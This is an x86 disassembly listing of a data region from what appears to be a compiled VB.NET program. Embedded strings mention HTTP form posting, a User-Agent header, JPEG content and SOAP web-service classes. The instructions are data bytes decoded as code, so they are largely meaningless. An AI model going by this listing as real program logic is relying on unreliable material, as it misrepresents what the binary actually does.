  40acfb:	00 69 00             	add    %ch,0x0(%ecx)
  40acfe:	63 00                	arpl   %eax,(%eax)
  40ad00:	61                   	popa
  40ad01:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40ad05:	00 6f 00             	add    %ch,0x0(%edi)
  40ad08:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad09:	00 2f                	add    %ch,(%edi)
  40ad0b:	00 78 00             	add    %bh,0x0(%eax)
  40ad0e:	2d 00 77 00 77       	sub    $0x77007700,%eax
  40ad13:	00 77 00             	add    %dh,0x0(%edi)
  40ad16:	2d 00 66 00 6f       	sub    $0x6f006600,%eax
  40ad1b:	00 72 00             	add    %dh,0x0(%edx)
  40ad1e:	6d                   	insl   (%dx),%es:(%edi)
  40ad1f:	00 2d 00 75 00 72    	add    %ch,0x72007500
  40ad25:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40ad29:	00 6e 00             	add    %ch,0x0(%esi)
  40ad2c:	63 00                	arpl   %eax,(%eax)
  40ad2e:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad2f:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40ad33:	00 64 00 0d          	add    %ah,0xd(%eax,%eax,1)
  40ad37:	00 0a                	add    %cl,(%edx)
  40ad39:	00 55 00             	add    %dl,0x0(%ebp)
  40ad3c:	73 00                	jae    0x40ad3e
  40ad3e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ad42:	2d 00 41 00 67       	sub    $0x67004100,%eax
  40ad47:	00 65 00             	add    %ah,0x0(%ebp)
  40ad4a:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad4b:	00 74 00 3a          	add    %dh,0x3a(%eax,%eax,1)
  40ad4f:	00 20                	add    %ah,(%eax)
  40ad51:	00 01                	add    %al,(%ecx)
  40ad53:	35 0d 00 0a 00       	xor    $0xa000d,%eax
  40ad58:	43                   	inc    %ebx
  40ad59:	00 6f 00             	add    %ch,0x0(%edi)
  40ad5c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad5d:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40ad61:	00 6e 00             	add    %ch,0x0(%esi)
  40ad64:	74 00                	je     0x40ad66
  40ad66:	2d 00 6c 00 65       	sub    $0x65006c00,%eax
  40ad6b:	00 6e 00             	add    %ch,0x0(%esi)
  40ad6e:	67 00 74 00          	add    %dh,0x0(%si)
  40ad72:	68 00 3a 00 20       	push   $0x20003a00
  40ad77:	00 35 00 32 00 33    	add    %dh,0x33003200
  40ad7d:	00 35 00 0d 00 0a    	add    %dh,0xa000d00
  40ad83:	00 0d 00 0a 00 01    	add    %cl,0x1000a00
  40ad89:	15 69 00 6d 00       	adc    $0x6d0069,%eax
  40ad8e:	61                   	popa
  40ad8f:	00 67 00             	add    %ah,0x0(%edi)
  40ad92:	65 00 2f             	add    %ch,%gs:(%edi)
  40ad95:	00 6a 00             	add    %ch,0x0(%edx)
  40ad98:	70 00                	jo     0x40ad9a
  40ad9a:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40ad9e:	00 00                	add    %al,(%eax)
  40ada0:	36 1d 43 7c de bf    	ss sbb $0xbfde7c43,%eax
  40ada6:	af                   	scas   %es:(%edi),%eax
  40ada7:	48                   	dec    %eax
  40ada8:	bc 8f 9a f5 fe       	mov    $0xfef59a8f,%esp
  40adad:	2f                   	das
  40adae:	e8 a2 00 08 b7       	call   0xb748ae55
  40adb3:	7a 5c                	jp     0x40ae11
  40adb5:	56                   	push   %esi
  40adb6:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40adb9:	89 08                	mov    %ecx,(%eax)
  40adbb:	b0 3f                	mov    $0x3f,%al
  40adbd:	5f                   	pop    %edi
  40adbe:	7f 11                	jg     0x40add1
  40adc0:	d5 0a                	aad    $0xa
  40adc2:	3a 03                	cmp    (%ebx),%al
  40adc4:	20 00                	and    %al,(%eax)
  40adc6:	01 03                	add    %eax,(%ebx)
  40adc8:	00 00                	add    %al,(%eax)
  40adca:	01 04 00             	add    %eax,(%eax,%eax,1)
  40adcd:	00 12                	add    %dl,(%edx)
  40adcf:	0c 07                	or     $0x7,%al
  40add1:	06                   	push   %es
  40add2:	15 12 18 01 12       	adc    $0x12011812,%eax
  40add7:	0c 04                	or     $0x4,%al
  40add9:	00 00                	add    %al,(%eax)
  40addb:	12 08                	adc    (%eax),%cl
  40addd:	07                   	pop    %es
  40adde:	06                   	push   %es
  40addf:	15 12 18 01 12       	adc    $0x12011812,%eax
  40ade4:	08 04 00             	or     %al,(%eax,%eax,1)
  40ade7:	00 12                	add    %dl,(%edx)
  40ade9:	11 07                	adc    %eax,(%edi)
  40adeb:	06                   	push   %es
  40adec:	15 12 18 01 12       	adc    $0x12011812,%eax
  40adf1:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40adf4:	00 12                	add    %dl,(%edx)
  40adf6:	14 07                	adc    $0x7,%al
  40adf8:	06                   	push   %es
  40adf9:	15 12 18 01 12       	adc    $0x12011812,%eax
  40adfe:	14 04                	adc    $0x4,%al
  40ae00:	08 00                	or     %al,(%eax)
  40ae02:	12 0c 04             	adc    (%esp,%eax,1),%cl
  40ae05:	08 00                	or     %al,(%eax)
  40ae07:	12 08                	adc    (%eax),%cl
  40ae09:	04 08                	add    $0x8,%al
  40ae0b:	00 12                	add    %dl,(%edx)
  40ae0d:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40ae10:	00 12                	add    %dl,(%edx)
  40ae12:	14 04                	adc    $0x4,%al
  40ae14:	20 01                	and    %al,(%ecx)
  40ae16:	02 1c 03             	add    (%ebx,%eax,1),%bl
  40ae19:	20 00                	and    %al,(%eax)
  40ae1b:	08 04 20             	or     %al,(%eax,%eiz,1)
  40ae1e:	00 12                	add    %dl,(%edx)
  40ae20:	15 03 20 00 0e       	adc    $0xe002003,%eax
  40ae25:	02 1e                	add    (%esi),%bl
  40ae27:	00 07                	add    %al,(%edi)
  40ae29:	10 01                	adc    %al,(%ecx)
  40ae2b:	01 1e                	add    %ebx,(%esi)
  40ae2d:	00 1e                	add    %bl,(%esi)
  40ae2f:	00 07                	add    %al,(%edi)
  40ae31:	30 01                	xor    %al,(%ecx)
  40ae33:	01 01                	add    %eax,(%ecx)
  40ae35:	10 1e                	adc    %bl,(%esi)
  40ae37:	00 02                	add    %al,(%edx)
  40ae39:	13 00                	adc    (%eax),%eax
  40ae3b:	04 20                	add    $0x20,%al
  40ae3d:	00 13                	add    %dl,(%ebx)
  40ae3f:	00 03                	add    %al,(%ebx)
  40ae41:	06                   	push   %es
  40ae42:	13 00                	adc    (%eax),%eax
  40ae44:	04 28                	add    $0x28,%al
  40ae46:	00 13                	add    %dl,(%ebx)
  40ae48:	00 02                	add    %al,(%edx)
  40ae4a:	06                   	push   %es
  40ae4b:	0e                   	push   %cs
  40ae4c:	03 06                	add    (%esi),%eax
  40ae4e:	12 19                	adc    (%ecx),%bl
  40ae50:	02 06                	add    (%esi),%al
  40ae52:	02 03                	add    (%ebx),%al
  40ae54:	06                   	push   %es
  40ae55:	12 1d 02 06 0a 03    	adc    0x30a0602,%bl
  40ae5b:	06                   	push   %es
  40ae5c:	1d 05 03 06 12       	sbb    $0x12060305,%eax
  40ae61:	21 03                	and    %eax,(%ebx)
  40ae63:	06                   	push   %es
  40ae64:	12 25 03 06 12 29    	adc    0x29120603,%ah
  40ae6a:	02 06                	add    (%esi),%al
  40ae6c:	1c 03                	sbb    $0x3,%al
  40ae6e:	00 00                	add    %al,(%eax)
  40ae70:	1c 05                	sbb    $0x5,%al
  40ae72:	00 01                	add    %al,(%ecx)
  40ae74:	01 12                	add    %edx,(%edx)
  40ae76:	2d 05 00 01 01       	sub    $0x1010005,%eax
  40ae7b:	1d 05 04 00 01       	sbb    $0x1000405,%eax
  40ae80:	01 0e                	add    %ecx,(%esi)
  40ae82:	03 06                	add    (%esi),%eax
  40ae84:	12 31                	adc    (%ecx),%dh
  40ae86:	04 00                	add    $0x0,%al
  40ae88:	00 12                	add    %dl,(%edx)
  40ae8a:	31 05 00 01 01 12    	xor    %eax,0x12010100
  40ae90:	31 02                	xor    %eax,(%edx)
  40ae92:	06                   	push   %es
  40ae93:	08 06                	or     %al,(%esi)
  40ae95:	00 02                	add    %al,(%edx)
  40ae97:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40ae9a:	35 08 00 05 01       	xor    $0x1050008,%eax
  40ae9f:	08 08                	or     %cl,(%eax)
  40aea1:	08 08                	or     %cl,(%eax)
  40aea3:	08 07                	or     %al,(%edi)
  40aea5:	00 04 02             	add    %al,(%edx,%eax,1)
  40aea8:	05 05 09 19 03       	add    $0x3190905,%eax
  40aead:	06                   	push   %es
  40aeae:	12 39                	adc    (%ecx),%bh
  40aeb0:	0b 00                	or     (%eax),%eax
  40aeb2:	08 18                	or     %bl,(%eax)
  40aeb4:	0e                   	push   %cs
  40aeb5:	08 08                	or     %cl,(%eax)
  40aeb7:	08 08                	or     %cl,(%eax)
  40aeb9:	08 08                	or     %cl,(%eax)
  40aebb:	08 02                	or     %al,(%edx)
  40aebd:	06                   	push   %es
  40aebe:	18 0a                	sbb    %cl,(%edx)
  40aec0:	00 05 02 06 10 0e    	add    %al,0xe100602
  40aec6:	08 10                	or     %dl,(%eax)
  40aec8:	0e                   	push   %cs
  40aec9:	08 03                	or     %al,(%ebx)
  40aecb:	00 00                	add    %al,(%eax)
  40aecd:	02 04 00             	add    (%eax,%eax,1),%al
  40aed0:	01 0e                	add    %ecx,(%esi)
  40aed2:	1c 03                	sbb    $0x3,%al
  40aed4:	00 00                	add    %al,(%eax)
  40aed6:	0e                   	push   %cs
  40aed7:	05 00 02 01 0e       	add    $0xe010200,%eax
  40aedc:	0e                   	push   %cs
  40aedd:	04 08                	add    $0x8,%al
  40aedf:	00 12                	add    %dl,(%edx)
  40aee1:	31 05 00 01 1d 05    	xor    %eax,0x51d0100
  40aee7:	0e                   	push   %cs
  40aee8:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40aeed:	05 04 00 01 0e       	add    $0xe010004,%eax
  40aef2:	0e                   	push   %cs
  40aef3:	04 00                	add    $0x0,%al
  40aef5:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40aef8:	06                   	push   %es
  40aef9:	00 02                	add    %al,(%edx)
  40aefb:	1c 1d                	sbb    $0x1d,%al
  40aefd:	05 0e 06 00 01       	add    $0x100060e,%eax
  40af02:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40af07:	06                   	push   %es
  40af08:	1d 0e 0c 00 09       	sbb    $0x9000c0e,%eax
  40af0d:	02 18                	add    (%eax),%bl
  40af0f:	08 08                	or     %cl,(%eax)
  40af11:	08 08                	or     %cl,(%eax)
  40af13:	18 08                	sbb    %cl,(%eax)
  40af15:	08 09                	or     %cl,(%ecx)
  40af17:	06                   	push   %es
  40af18:	00 02                	add    %al,(%edx)
  40af1a:	01 11                	add    %edx,(%ecx)
  40af1c:	3d 08 05 00 01       	cmp    $0x1000508,%eax
  40af21:	12 41 0e             	adc    0xe(%ecx),%al
  40af24:	05 20 02 01 1c       	add    $0x1c010220,%eax
  40af29:	18 08                	sbb    %cl,(%eax)
  40af2b:	20 03                	and    %al,(%ebx)
  40af2d:	12 2d 0e 12 49 1c    	adc    0x1c49120e,%ch
  40af33:	05 20 01 01 12       	add    $0x12010120,%eax
  40af38:	2d 04 20 01 01       	sub    $0x1012004,%eax
  40af3d:	0e                   	push   %cs
  40af3e:	05 20 01 01 11       	add    $0x11010120,%eax
  40af43:	51                   	push   %ecx
  40af44:	08 01                	or     %al,(%ecx)
  40af46:	00 01                	add    %al,(%ecx)
  40af48:	00 00                	add    %al,(%eax)
  40af4a:	00 00                	add    %al,(%eax)
  40af4c:	00 05 20 02 01 0e    	add    %al,0xe010220
  40af52:	0e                   	push   %cs
  40af53:	18 01                	sbb    %al,(%ecx)
  40af55:	00 0a                	add    %cl,(%edx)
  40af57:	4d                   	dec    %ebp
  40af58:	79 54                	jns    0x40afae
  40af5a:	65 6d                	gs insl (%dx),%es:(%edi)
  40af5c:	70 6c                	jo     0x40afca
  40af5e:	61                   	popa
  40af5f:	74 65                	je     0x40afc6
  40af61:	08 31                	or     %dh,(%ecx)
  40af63:	34 2e                	xor    $0x2e,%al
  40af65:	30 2e                	xor    %ch,(%esi)
  40af67:	30 2e                	xor    %ch,(%esi)
  40af69:	30 00                	xor    %al,(%eax)
  40af6b:	00 04 01             	add    %al,(%ecx,%eax,1)
  40af6e:	00 00                	add    %al,(%eax)
  40af70:	00 06                	add    %al,(%esi)
  40af72:	15 12 18 01 12       	adc    $0x12011812,%eax
  40af77:	0c 06                	or     $0x6,%al
  40af79:	15 12 18 01 12       	adc    $0x12011812,%eax
  40af7e:	08 06                	or     %al,(%esi)
  40af80:	15 12 18 01 12       	adc    $0x12011812,%eax
  40af85:	11 06                	adc    %eax,(%esi)
  40af87:	15 12 18 01 12       	adc    $0x12011812,%eax
  40af8c:	14 04                	adc    $0x4,%al
  40af8e:	07                   	pop    %es
  40af8f:	01 12                	add    %edx,(%edx)
  40af91:	0c 04                	or     $0x4,%al
  40af93:	07                   	pop    %es
  40af94:	01 12                	add    %edx,(%edx)
  40af96:	08 04 07             	or     %al,(%edi,%eax,1)
  40af99:	01 12                	add    %edx,(%edx)
  40af9b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  40af9e:	01 12                	add    %edx,(%edx)
  40afa0:	14 10                	adc    $0x10,%al
  40afa2:	01 00                	add    %eax,(%eax)
  40afa4:	0b 4d 79             	or     0x79(%ebp),%ecx
  40afa7:	2e 43                	cs inc %ebx
  40afa9:	6f                   	outsl  %ds:(%esi),(%dx)
  40afaa:	6d                   	insl   (%dx),%es:(%edi)
  40afab:	70 75                	jo     0x40b022
  40afad:	74 65                	je     0x40b014
  40afaf:	72 00                	jb     0x40afb1
  40afb1:	00 13                	add    %dl,(%ebx)
  40afb3:	01 00                	add    %eax,(%eax)
  40afb5:	0e                   	push   %cs
  40afb6:	4d                   	dec    %ebp
  40afb7:	79 2e                	jns    0x40afe7
  40afb9:	41                   	inc    %ecx
  40afba:	70 70                	jo     0x40b02c
  40afbc:	6c                   	insb   (%dx),%es:(%edi)
  40afbd:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40afc4:	00 00                	add    %al,(%eax)
  40afc6:	0c 01                	or     $0x1,%al
  40afc8:	00 07                	add    %al,(%edi)
  40afca:	4d                   	dec    %ebp
  40afcb:	79 2e                	jns    0x40affb
  40afcd:	55                   	push   %ebp
  40afce:	73 65                	jae    0x40b035
  40afd0:	72 00                	jb     0x40afd2
  40afd2:	00 13                	add    %dl,(%ebx)
  40afd4:	01 00                	add    %eax,(%eax)
  40afd6:	0e                   	push   %cs
  40afd7:	4d                   	dec    %ebp
  40afd8:	79 2e                	jns    0x40b008
  40afda:	57                   	push   %edi
  40afdb:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  40afdf:	72 76                	jb     0x40b057
  40afe1:	69 63 65 73 00 00 04 	imul   $0x4000073,0x65(%ebx),%esp
  40afe8:	00 01                	add    %al,(%ecx)
  40afea:	1c 1c                	sbb    $0x1c,%al
  40afec:	03 07                	add    (%edi),%eax
  40afee:	01 02                	add    %eax,(%edx)
  40aff0:	03 07                	add    (%edi),%eax
  40aff2:	01 08                	add    %ecx,(%eax)
  40aff4:	06                   	push   %es
  40aff5:	00 01                	add    %al,(%ecx)
  40aff7:	12 15 11 6d 04 07    	adc    0x7046d11,%dl
  40affd:	01 12                	add    %edx,(%edx)
  40afff:	15 03 07 01 0e       	adc    $0xe010703,%eax
  40b004:	05 10 01 00 1e       	add    $0x1e000110,%eax
  40b009:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40b00c:	01 1e                	add    %ebx,(%esi)
  40b00e:	00 04 07             	add    %al,(%edi,%eax,1)
  40b011:	01 1e                	add    %ebx,(%esi)
  40b013:	00 07                	add    %al,(%edi)
  40b015:	20 04 01             	and    %al,(%ecx,%eax,1)
  40b018:	0e                   	push   %cs
  40b019:	0e                   	push   %cs
  40b01a:	0e                   	push   %cs
  40b01b:	0e                   	push   %cs
  40b01c:	61                   	popa
  40b01d:	01 00                	add    %eax,(%eax)
  40b01f:	34 53                	xor    $0x53,%al
  40b021:	79 73                	jns    0x40b096
  40b023:	74 65                	je     0x40b08a
  40b025:	6d                   	insl   (%dx),%es:(%edi)
  40b026:	2e 57                	cs push %edi
  40b028:	65 62 2e             	bound  %ebp,%gs:(%esi)
  40b02b:	53                   	push   %ebx
  40b02c:	65 72 76             	gs jb  0x40b0a5
  40b02f:	69 63 65 73 2e 50 72 	imul   $0x72502e73,0x65(%ebx),%esp
  40b036:	6f                   	outsl  %ds:(%esi),(%dx)
  40b037:	74 6f                	je     0x40b0a8
  40b039:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40b03c:	73 2e                	jae    0x40b06c
  40b03e:	53                   	push   %ebx
  40b03f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b040:	61                   	popa
  40b041:	70 48                	jo     0x40b08b
  40b043:	74 74                	je     0x40b0b9
  40b045:	70 43                	jo     0x40b08a
  40b047:	6c                   	insb   (%dx),%es:(%edi)
  40b048:	69 65 6e 74 50 72 6f 	imul   $0x6f725074,0x6e(%ebp),%esp
  40b04f:	74 6f                	je     0x40b0c0
  40b051:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40b054:	12 43 72             	adc    0x72(%ebx),%al
  40b057:	65 61                	gs popa
  40b059:	74 65                	je     0x40b0c0
  40b05b:	5f                   	pop    %edi
  40b05c:	5f                   	pop    %edi
  40b05d:	49                   	dec    %ecx
  40b05e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b05f:	73 74                	jae    0x40b0d5
  40b061:	61                   	popa
  40b062:	6e                   	outsb  %ds:(%esi),(%dx)
  40b063:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  40b066:	5f                   	pop    %edi
  40b067:	13 44 69 73          	adc    0x73(%ecx,%ebp,2),%eax
  40b06b:	70 6f                	jo     0x40b0dc
  40b06d:	73 65                	jae    0x40b0d4
  40b06f:	5f                   	pop    %edi
  40b070:	5f                   	pop    %edi
  40b071:	49                   	dec    %ecx
  40b072:	6e                   	outsb  %ds:(%esi),(%dx)
  40b073:	73 74                	jae    0x40b0e9
  40b075:	61                   	popa
  40b076:	6e                   	outsb  %ds:(%esi),(%dx)
  40b077:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  40b07a:	5f                   	pop    %edi
  40b07b:	00 00                	add    %al,(%eax)
  40b07d:	00 06                	add    %al,(%esi)
  40b07f:	15 12 18 01 13       	adc    $0x13011812,%eax
  40b084:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40b087:	01 13                	add    %edx,(%ebx)
  40b089:	00 04 07             	add    %al,(%edi,%eax,1)
  40b08c:	01 13                	add    %edx,(%ebx)
  40b08e:	00 04 20             	add    %al,(%eax,%eiz,1)
  40b091:	01 01                	add    %eax,(%ecx)
  40b093:	02 05 01 00 00 00    	add    0x1,%al
  40b099:	00 05 20 00 12 80    	add    %al,0x80120020
  40b09f:	85 07                	test   %eax,(%edi)
  40b0a1:	20 02                	and    %al,(%edx)
  40b0a3:	12 2d 12 49 1c 31    	adc    0x311c4912,%ch
  40b0a9:	01 00                	add    %eax,(%eax)
  40b0ab:	12 3c 67             	adc    (%edi,%eiz,2),%bh
  40b0ae:	65 6e                	outsb  %gs:(%esi),(%dx)
  40b0b0:	65 72 61             	gs jb  0x40b114
  40b0b3:	74 65                	je     0x40b11a
  40b0b5:	64 20 6d 65          	and    %ch,%fs:0x65(%ebp)
  40b0b9:	74 68                	je     0x40b123
  40b0bb:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0bc:	64 3e 01 00          	fs add %eax,%ds:(%eax)
  40b0c0:	54                   	push   %esp
  40b0c1:	0e                   	push   %cs
  40b0c2:	04 54                	add    $0x54,%al
  40b0c4:	79 70                	jns    0x40b136
  40b0c6:	65 12 3c 67          	adc    %gs:(%edi,%eiz,2),%bh
  40b0ca:	65 6e                	outsb  %gs:(%esi),(%dx)
  40b0cc:	65 72 61             	gs jb  0x40b130
  40b0cf:	74 65                	je     0x40b136
  40b0d1:	64 20 6d 65          	and    %ch,%fs:0x65(%ebp)
  40b0d5:	74 68                	je     0x40b13f
  40b0d7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0d8:	64 3e 04 00          	fs ds add $0x0,%al
  40b0dc:	01 01                	add    %eax,(%ecx)
  40b0de:	08 06                	or     %al,(%esi)
  40b0e0:	00 01                	add    %al,(%ecx)
  40b0e2:	0e                   	push   %cs
  40b0e3:	11 80 99 06 00 03    	adc    %eax,0x3000699(%eax)
  40b0e9:	0e                   	push   %cs
  40b0ea:	0e                   	push   %cs
  40b0eb:	0e                   	push   %cs
  40b0ec:	0e                   	push   %cs
  40b0ed:	06                   	push   %es
  40b0ee:	20 01                	and    %al,(%ecx)
  40b0f0:	01 11                	add    %edx,(%ecx)
  40b0f2:	80 ad 06 00 01 01 12 	subb   $0x12,0x1010006(%ebp)
  40b0f9:	80 91 06 20 01 01 12 	adcb   $0x12,0x1012006(%ecx)
  40b100:	80 b5 0b 07 04 12 39 	xorb   $0x39,0x1204070b(%ebp)
  40b107:	0e                   	push   %cs
  40b108:	12 80 8d 12 80 91    	adc    -0x6e7fed73(%eax),%al
  40b10e:	05 20 02 08 08       	add    $0x8080220,%eax
  40b113:	08 03                	or     %al,(%ebx)
  40b115:	20 00                	and    %al,(%eax)
  40b117:	02 04 00             	add    (%eax,%eax,1),%al
  40b11a:	01 01                	add    %eax,(%ecx)
  40b11c:	1c 0c                	sbb    $0xc,%al
  40b11e:	20 03                	and    %al,(%ebx)
  40b120:	01 11                	add    %edx,(%ecx)
  40b122:	80 cd 11             	or     $0x11,%ch
  40b125:	80 d1 11             	adc    $0x11,%cl
  40b128:	80 d5 04             	adc    $0x4,%ch
  40b12b:	20 01                	and    %al,(%ecx)
  40b12d:	01 08                	add    %ecx,(%eax)
  40b12f:	04 00                	add    $0x0,%al
  40b131:	01 08                	add    %ecx,(%eax)
  40b133:	0e                   	push   %cs
  40b134:	05 20 02 01 0e       	add    $0xe010220,%eax
  40b139:	08 0e                	or     %cl,(%esi)
  40b13b:	20 06                	and    %al,(%esi)
  40b13d:	12 2d 1d 05 08 08    	adc    0x808051d,%ch
  40b143:	11 80 e1 12 49 1c    	adc    %eax,0x1c4912e1(%eax)
  40b149:	09 20                	or     %esp,(%eax)
  40b14b:	04 01                	add    $0x1,%al
  40b14d:	12 80 c9 1c 08 08    	adc    0x8081cc9(%eax),%al
  40b153:	08 07                	or     %al,(%edi)
  40b155:	02 12                	add    (%edx),%dl
  40b157:	80 c9 12             	or     $0x12,%cl
  40b15a:	80 91 05 20 02 0e 0e 	adcb   $0xe,0xe022005(%ecx)
  40b161:	0e                   	push   %cs
  40b162:	05 00 00 12 80       	add    $0x80120000,%eax
  40b167:	ed                   	in     (%dx),%eax
  40b168:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40b16d:	0e                   	push   %cs
  40b16e:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40b173:	1c 09                	sbb    $0x9,%al
  40b175:	07                   	pop    %es
  40b176:	04 1c                	add    $0x1c,%al
  40b178:	12 80 e9 02 1d 1c    	adc    0x1c1d02e9(%eax),%al
  40b17e:	05 20 01 08 12       	add    $0x12080120,%eax
  40b183:	2d 04 20 00 1d       	sub    $0x1d002004,%eax
  40b188:	05 04 00 01 0a       	add    $0xa010004,%eax
  40b18d:	0e                   	push   %cs
  40b18e:	04 20                	add    $0x20,%al
  40b190:	01 01                	add    %eax,(%ecx)
  40b192:	05 07 20 03 01       	add    $0x1032007,%eax
  40b197:	1d 05 08 08 03       	sbb    $0x3080805,%eax
  40b19c:	20 00                	and    %al,(%eax)
  40b19e:	0a 07                	or     (%edi),%al
  40b1a0:	00 02                	add    %al,(%edx)
  40b1a2:	02 12                	add    (%edx),%dl
  40b1a4:	80 f9 1c             	cmp    $0x1c,%cl
  40b1a7:	06                   	push   %es
  40b1a8:	07                   	pop    %es
  40b1a9:	02 08                	add    (%eax),%cl
  40b1ab:	12 80 91 05 07 01    	adc    0x1070591(%eax),%al
  40b1b1:	12 80 91 06 00 02    	adc    0x2000691(%eax),%al
  40b1b7:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40b1ba:	02 04 00             	add    (%eax,%eax,1),%al
  40b1bd:	01 0e                	add    %ecx,(%esi)
  40b1bf:	08 07                	or     %al,(%edi)
  40b1c1:	20 02                	and    %al,(%edx)
  40b1c3:	02 08                	add    (%eax),%cl
  40b1c5:	11 81 09 0d 07 06    	adc    %eax,0x6070d09(%ecx)
  40b1cb:	12 21                	adc    (%ecx),%ah
  40b1cd:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40b1d2:	80 91 1c 02 0b 07 03 	adcb   $0x3,0x70b021c(%ecx)
  40b1d9:	12 80 91 12 80 91    	adc    -0x6e7fed6f(%eax),%al
  40b1df:	12 80 91 02 1d 05    	adc    0x51d0291(%eax),%al
  40b1e5:	04 07                	add    $0x7,%al
  40b1e7:	01 12                	add    %edx,(%edx)
  40b1e9:	31 06                	xor    %eax,(%esi)
  40b1eb:	20 01                	and    %al,(%ecx)
  40b1ed:	01 12                	add    %edx,(%edx)
  40b1ef:	81 15 08 07 02 12 81 	adcl   $0x81121581,0x12020708
  40b1f6:	15 12 81 
  40b1f9:	15 05 00 02 1c       	adc    $0x1c020005,%eax
  40b1fe:	1c 1c                	sbb    $0x1c,%al
  40b200:	07                   	pop    %es
  40b201:	07                   	pop    %es
  40b202:	02 12                	add    (%edx),%dl
  40b204:	34 12                	xor    $0x12,%al
  40b206:	80 91 0a 00 04 1d 0e 	adcb   $0xe,0x1d04000a(%ecx)
  40b20d:	0e                   	push   %cs
  40b20e:	0e                   	push   %cs
  40b20f:	08 11                	or     %dl,(%ecx)
  40b211:	81 45 06 00 03 08 0e 	addl   $0xe080300,0x6(%ebp)
  40b218:	0e                   	push   %cs
  40b219:	02 06                	add    (%esi),%al
  40b21b:	20 01                	and    %al,(%ecx)
  40b21d:	01 11                	add    %edx,(%ecx)
  40b21f:	81 4d 11 00 08 1c 1c 	orl    $0x1c1c0800,0x11(%ebp)
  40b226:	12 15 0e 1d 1c 1d    	adc    0x1d1c1d0e,%dl
  40b22c:	0e                   	push   %cs
  40b22d:	1d 12 15 1d 02       	sbb    $0x21d1512,%eax
  40b232:	02 06                	add    (%esi),%al
  40b234:	00 02                	add    %al,(%edx)
  40b236:	1c 1c                	sbb    $0x1c,%al
  40b238:	12 15 05 00 00 12    	adc    0x12000005,%dl
  40b23e:	81 55 05 20 00 11 81 	adcl   $0x81110020,0x5(%ebp)
  40b245:	2d 04 20 00 11       	sub    $0x11002004,%eax
  40b24a:	3d 10 00 07 1c       	cmp    $0x1c070010,%eax
  40b24f:	1c 12                	sbb    $0x12,%al
  40b251:	15 0e 1d 1c 1d       	adc    $0x1d1c1d0e,%eax
  40b256:	0e                   	push   %cs
  40b257:	1d 12 15 1d 02       	sbb    $0x21d1512,%eax
  40b25c:	05 20 02 01 08       	add    $0x8010220,%eax
  40b261:	08 06                	or     %al,(%esi)
  40b263:	00 01                	add    %al,(%ecx)
  40b265:	01 11                	add    %edx,(%ecx)
  40b267:	81 31 04 00 01 02    	xorl   $0x2010004,(%ecx)
  40b26d:	0e                   	push   %cs
  40b26e:	04 00                	add    $0x0,%al
  40b270:	01 05 0e 02 06 19    	add    %eax,0x1906020e
  40b276:	05 00 01 12 31       	add    $0x31120100,%eax
  40b27b:	0e                   	push   %cs
  40b27c:	05 00 02 1c 0e       	add    $0xe1c0200,%eax
  40b281:	0e                   	push   %cs
  40b282:	0e                   	push   %cs
  40b283:	00 06                	add    %al,(%esi)
  40b285:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40b288:	15 0e 1d 1c 1d       	adc    $0x1d1c1d0e,%eax
  40b28d:	0e                   	push   %cs
  40b28e:	1d 12 15 09 00       	sbb    $0x91512,%eax
  40b293:	04 08                	add    $0x8,%al
  40b295:	0e                   	push   %cs
  40b296:	11 81 6d 02 08 05    	adc    %eax,0x508026d(%ecx)
  40b29c:	20 00                	and    %al,(%eax)
  40b29e:	12 81 35 05 20 00    	adc    0x200535(%ecx),%al
  40b2a4:	11 81 39 05 20 00    	adc    %eax,0x200539(%ecx)
  40b2aa:	12 81 21 05 00 00    	adc    0x521(%ecx),%al
  40b2b0:	1d 12 31 05 00       	sbb    $0x53112,%eax
  40b2b5:	01 0e                	add    %ecx,(%esi)
  40b2b7:	1d 0e 05 00 01       	sbb    $0x100050e,%eax
  40b2bc:	12 31                	adc    (%ecx),%dh
  40b2be:	08 05 00 02 01 0e    	or     %al,0xe010200
  40b2c4:	02 05 20 00 12 81    	add    0x81120020,%al
  40b2ca:	7d 04                	jge    0x40b2d0
  40b2cc:	20 01                	and    %al,(%ecx)
  40b2ce:	0e                   	push   %cs
  40b2cf:	0e                   	push   %cs
  40b2d0:	05 20 02 01 0e       	add    $0xe010220,%eax
  40b2d5:	02 0b                	add    (%ebx),%cl
  40b2d7:	20 04 12             	and    %al,(%edx,%edx,1)
  40b2da:	81 81 08 08 12 81 85 	addl   $0x51885,-0x7eedf7f8(%ecx)
  40b2e1:	18 05 00 
  40b2e4:	00 12                	add    %dl,(%edx)
  40b2e6:	81 8d 09 20 02 01 12 	orl    $0x12f58012,0x1022009(%ebp)
  40b2ed:	80 f5 12 
  40b2f0:	81 8d 07 00 02 01 0e 	orl    $0x2981110e,0x1020007(%ebp)
  40b2f7:	11 81 29 
